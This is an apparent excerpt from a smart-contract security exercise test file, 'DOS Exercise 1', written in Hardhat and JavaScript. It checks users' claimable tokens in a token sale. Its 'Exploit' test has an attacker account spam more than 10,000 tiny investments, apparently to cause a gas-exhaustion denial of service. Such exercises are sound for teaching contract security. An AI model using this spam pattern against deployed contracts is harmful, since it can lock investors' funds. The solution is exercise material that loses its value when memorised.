...
describe("DOS Exercise 1", function () {
  ...
  before(async function () {
    ...
    expect(await this.tokenSale.claimable(user1.address, 0)).to.be.equal(
      USER1_INVESTMENT.mul(5)
    );
    expect(await this.tokenSale.claimable(user2.address, 0)).to.be.equal(
      USER2_INVESTMENT.mul(5)
    );
    expect(await this.tokenSale.claimable(user3.address, 0)).to.be.equal(
  ...
  it("Exploit", async function () {
    ...
    const ATTACKER_INVESTMENTS = ethers.utils.parseEther("0.000000001");
    for (var i = 0; i <= 10000; i++) {
      this.tokenSale.connect(attacker).invest({ value: ATTACKER_INVESTMENTS });
    }
  }).timeout(100000000);
